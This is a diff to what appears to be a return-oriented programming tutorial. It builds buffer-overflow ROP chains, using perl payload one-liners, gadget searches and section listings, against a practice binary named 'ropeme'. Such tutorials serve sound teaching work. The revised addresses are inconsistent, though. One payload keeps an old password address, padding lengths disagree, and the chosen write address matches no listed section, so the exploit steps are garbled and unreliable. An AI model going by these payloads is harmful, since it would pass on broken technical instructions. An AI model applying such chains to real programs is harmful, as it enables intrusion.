@@ -251,34 +251,34 @@ The address of puts is direct:
 ::
 
     $ rabin2 -s ropeme | grep puts
-    vaddr=0x08048380 paddr=0x00000380 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts
+    vaddr=0x080483a0 paddr=0x000003a0 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts
 
-So [puts address] is 0x08048330. In the same way we find the password address:
+So [puts address] is 0x080483a0. In the same way we find the password address:
 
 ::
 
     $ rabin2 -z ropeme
     ...
-    vaddr=0x080486a2 paddr=0x000006a2 ordinal=004 sz=17 len=9 section=.rodata type=ascii string=ĳùð−÷<>[×
+    vaddr=0x08048712 paddr=0x00000712 ordinal=004 sz=17 len=9 section=.rodata type=ascii string=ĳùð−÷<>[×
     ...
 
 By the way note how rabin2 isn't troubled at all by the weird password.
 
-So far our stack is something like: "80830408XXXXXXXXa2860408". Right now the
+So far our stack is something like: "a0830408XXXXXXXX12870408". Right now the
 return address isn't really important, we will return to the end of the
 check_password function, just before the return statement, at address
-0x0804857d.
+0x080485e1.
 
 ::
 
     # Stack wanted:
     #
-    # ^ [password    address] = 0x080486a2
-    # | [puts return address] = 0x0804857d
-    # | [puts        address] = 0x08048380
-    # | [padding to overflow] = "A" x 92
+    # ^ [password    address] = 0x08048712
+    # | [puts return address] = 0x080485e1
+    # | [puts        address] = 0x080483a0
+    # | [padding to overflow] = "A" x 100
 
-    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\xa2\x86\x04\x08"' | ./ropeme admin42
+    $ perl -e 'print "A"x100 . "\xa0\x83\x04\x08\x12\x87\x04\x08\xa2\x86\x04\x08"' | ./ropeme admin42
     Enter password: Wrong password
     ĳùð−÷<>[×
     Segmentation fault (core dumped)
@@ -324,31 +324,32 @@ arguments off the stack. Let's use radare2 to find something like that.
     $ r2 ropeme
      -- Do you want to print 333.5K chars? (y/N)
     [0x08048360]> /R pop
+    [0x080483e0]> /R pop
         ...
 
-      0x08048538             5b  pop ebx
-      0x08048539             5e  pop esi
-      0x0804853a             5f  pop edi
-      0x0804853b             5d  pop ebp
-      0x0804853c             c3  ret
+          0x080486a8             5b  pop ebx
+          0x080486a9             5e  pop esi
+          0x080486aa             5f  pop edi
+          0x080486ab             5d  pop ebp
+          0x080486ac             c3  ret
 
         ...
 
 Better than what we needed! We will only use the last three pops. Returning
-to 0x08048539 will clear the stack of its three last elements then return
+to 0x080486a9 will clear the stack of its three last elements then return
 normally to the next function. I will refer to that address as pppr for
 "pop pop pop ret". Our stack now looks like that:
 
 ::
 
     ^ [string address]
-    | [end    address] = 0x0804857d
-    | [puts   address] = 0x08048380
+    | [end    address] = 0x080485e1
+    | [puts   address] = 0x080483a0
     | [string len    ] = 0x0000000e
     | [string address]
     | [stdin  fd     ] = 0x00000000
-    | [pppr   address] = 0x08048539
-    | [read   address] = 0x08048360
+    | [pppr   address] = 0x080486a9
+    | [read   address] = 0x08048380
     | [padding       ] = 'A' x 92
 
 The only thing we lack is an address to write to. We need to find a section
@@ -358,15 +359,15 @@ We can use radare2 for that:
 ::
 
     $ rabin2 -S ropeme | grep "perm=..rw"
-    idx=17 vaddr=0x0804982c paddr=0x0000082c sz=4 vsz=4 perm=--rw- name=.init_array
-    idx=18 vaddr=0x08049830 paddr=0x00000830 sz=4 vsz=4 perm=--rw- name=.fini_array
-    idx=19 vaddr=0x08049834 paddr=0x00000834 sz=4 vsz=4 perm=--rw- name=.jcr
-    idx=20 vaddr=0x08049838 paddr=0x00000838 sz=232 vsz=232 perm=--rw- name=.dynamic
-    idx=21 vaddr=0x08049920 paddr=0x00000920 sz=4 vsz=4 perm=--rw- name=.got
-    idx=22 vaddr=0x08049924 paddr=0x00000924 sz=36 vsz=36 perm=--rw- name=.got.plt
-    idx=23 vaddr=0x08049948 paddr=0x00000948 sz=8 vsz=8 perm=--rw- name=.data
-    idx=24 vaddr=0x08049950 paddr=0x00000950 sz=8 vsz=8 perm=--rw- name=.bss
-    idx=30 vaddr=0x0804982c paddr=0x0000082c sz=292 vsz=4096 perm=m-rw- name=phdr1
+    idx=17 vaddr=0x0804989c paddr=0x0000089c sz=4 vsz=4 perm=--rw- name=.init_array
+    idx=18 vaddr=0x080498a0 paddr=0x000008a0 sz=4 vsz=4 perm=--rw- name=.fini_array
+    idx=19 vaddr=0x080498a4 paddr=0x000008a4 sz=4 vsz=4 perm=--rw- name=.jcr
+    idx=20 vaddr=0x080498a8 paddr=0x000008a8 sz=232 vsz=232 perm=--rw- name=.dynamic
+    idx=21 vaddr=0x08049990 paddr=0x00000990 sz=4 vsz=4 perm=--rw- name=.got
+    idx=22 vaddr=0x08049994 paddr=0x00000994 sz=40 vsz=40 perm=--rw- name=.got.plt
+    idx=23 vaddr=0x080499bc paddr=0x000009bc sz=8 vsz=8 perm=--rw- name=.data
+    idx=24 vaddr=0x080499c4 paddr=0x000009c4 sz=8 vsz=8 perm=--rw- name=.bss
+    idx=30 vaddr=0x0804989c paddr=0x0000089c sz=296 vsz=4096 perm=m-rw- name=phdr1
     idx=31 vaddr=0x08048000 paddr=0x00000000 sz=52 vsz=52 perm=m-rw- name=ehdr
 
 Most sections are too small... The .dynamic seems large enough to be
@@ -374,14 +375,14 @@ interesting though. We'll use it.
 
 ::
 
-    ^ [string address] = 0x08049838
-    | [end    address] = 0x0804857d
-    | [puts   address] = 0x08048380
+    ^ [string address] = 0x08049712
+    | [end    address] = 0x080485e1
+    | [puts   address] = 0x080483a0
     | [string len    ] = 0x0000000e
-    | [string address] = 0x08049838
+    | [string address] = 0x08049712
     | [stdin  fd     ] = 0x00000000
-    | [pppr   address] = 0x08048539
-    | [read   address] = 0x08048360
+    | [pppr   address] = 0x080486a9
+    | [read   address] = 0x08048380
     | [padding       ] = 'A' x 92
 
 Let's try that!
@@ -390,14 +391,14 @@ Let's try that!
 
     $ perl - <<EOF | ./ropeme admin42
     print "A" x 92
-    . "\x60\x83\x04\x08"
-    . "\x39\x85\x04\x08"
-    . "\x00\x00\x00\x00"
-    . "\x38\x98\x04\x08"
-    . "\x0e\x00\x00\x00"
     . "\x80\x83\x04\x08"
-    . "\x7d\x85\x04\x08"
-    . "\x38\x98\x04\x08"
+    . "\xa9\x86\x04\x08"
+    . "\x00\x00\x00\x00"
+    . "\x12\x97\x04\x08"
+    . "\x0e\x00\x00\x00"
+    . "\xa0\x83\x04\x08"
+    . "\xe1\x85\x04\x08"
+    . "\x12\x97\x04\x08"
     EOF
     Enter password:
     [...]
@@ -411,26 +412,26 @@ input just after:
 
 ::
     ^ [padding       ] = 'B' x 388
-    | [string address] = 0x08049838
-    | [end    address] = 0x0804857d
-    | [puts   address] = 0x08048380
+    | [string address] = 0x08049712
+    | [end    address] = 0x080485e1
+    | [puts   address] = 0x080483a0
     | [string len    ] = 0x0000000e
-    | [string address] = 0x08049838
+    | [string address] = 0x08049712
     | [stdin  fd     ] = 0x00000000
-    | [pppr   address] = 0x08048539
-    | [read   address] = 0x08048360
+    | [pppr   address] = 0x080486a9
+    | [read   address] = 0x08048380
     | [padding       ] = 'A' x 92
 
     $ perl - <<EOF | ./ropeme admin42
     print "A" x 92
-    . "\x60\x83\x04\x08"
-    . "\x39\x85\x04\x08"
-    . "\x00\x00\x00\x00"
-    . "\x38\x98\x04\x08"
-    . "\x0e\x00\x00\x00"
     . "\x80\x83\x04\x08"
-    . "\x7d\x85\x04\x08"
-    . "\x38\x98\x04\x08"
+    . "\xa9\x86\x04\x08"
+    . "\x00\x00\x00\x00"
+    . "\x12\x97\x04\x08"
+    . "\x0e\x00\x00\x00"
+    . "\xa0\x83\x04\x08"
+    . "\xe1\x85\x04\x08"
+    . "\x12\x97\x04\x08"
     . "B" x 388
     . "Hello World!\x00"
     EOF
